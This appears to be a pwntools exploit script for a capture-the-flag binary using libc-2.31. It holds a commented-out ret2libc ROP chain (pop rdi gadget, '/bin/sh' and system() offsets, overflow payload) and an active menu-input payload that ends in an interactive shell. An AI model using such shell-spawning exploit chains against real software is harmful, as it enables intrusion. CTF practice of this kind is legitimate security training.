from pwn import *
import random

LOCAL = True
REMOTE = False
GDB = False
USE_ONE_GADGET = False
context.arch = 'amd64'
context.os = 'linux'
context.endian = 'little'
context.terminal = ['tmux', 'splitw', '-h']

LOCAL_BIN = "./Test_Subject_087"
LIBC = "./libc-2.31.so" #ELF("./libc-2.31.so") #Set library path when know it
ENV = {"LD_PRELOAD": LIBC} if LIBC else {}


if LOCAL:
    p = process(LOCAL_BIN, env=ENV)
    ELF_LOADED = ELF(LOCAL_BIN)
    ROP_LOADED = ROP(ELF_LOADED)

elif REMOTE:
    r = remote('ctf.adl.tw', )
    ELF_LOADED = ELF(LOCAL_BIN)
    ROP_LOADED = ROP(ELF_LOADED)

if GDB and not REMOTE:
    gdb.attach(p) # "b *(get_line+(0x15ae-0x150f))"

random.seed(None)
lib = ELF('./libc-2.31.so')
ROP_LIBC = ROP(lib)

# # print('%x'%ELF_LOADED.plt['write'])
# elf_base = ELF_LOADED.address # ! Memory leaking needed
# lib_base = lib.address # ! Memory leaking needed
# print(hex(ELF_LOADED.address))
# print(hex(lib.address))

# # rop = ROP(ELF_LOADED)
# # rop.chain()
# # rop_gadget = elf_base + ROP_LOADED.find_gadget(['pop rdi', 'ret'])[0] # elf_base + 0x23a3
# rop_gadget = lib_base + ROP_LIBC.find_gadget(['pop rdi', 'ret'])[0] # lib_base + 0x23b6a
# # print('%x'%ROP_LOADED.find_gadget(['pop rdi', 'ret'])[0])
# print('%x'%ROP_LIBC.find_gadget(['pop rdi', 'ret'])[0]) # 0x23b6a

# sh = lib.search(b"/bin/sh\x00")
# sh = next(sh)
# print('%x'%sh) # 0x1b45bd

# bin_sh = lib_base + sh
# print('%x'%lib.symbols['system']) # 0x52290
# # print('%x'%ELF_LOADED.symbols['system']) # 
# system_addr = lib_base + lib.symbols['system']
# list_something = ['wakuwaku', 'peanuts', 'Bondman', 'jinan', 'saigo no bansan', 'spy wars', 'Bond', 'odekeke', 'chichi', 'haha', 'kimerasan',
#                   'san bun no san', 'sekai heiwa', 'daijoubumasu', 'okey dokey', 'hito ga gomi no youda']
                  
# print(len(list_something))
# list_rand_int = []

# for i in range(16):
#     list_rand_int.append(random.randint(0, 32767))

n = 100 # h + 8

# payload = b'help\0' + b'a' * (n - 5 - 1) + p64(rop_gadget) + p64(bin_sh) + p64(system_addr) + b'\n'
payload = b'3\n2\n \n' * n


# 0x23b6a (ROP gadget)　$rbp+8
# 0x1b45bd (sh) $rbp+16
# 0x52290 system() $rbp+24


# p.recvuntil(b'!')
p.sendafter(b'> ', payload)
# r.recvuntil(b'!')
# r.sendafter(b'~> ', payload)

# r.interactive()

p.interactive()
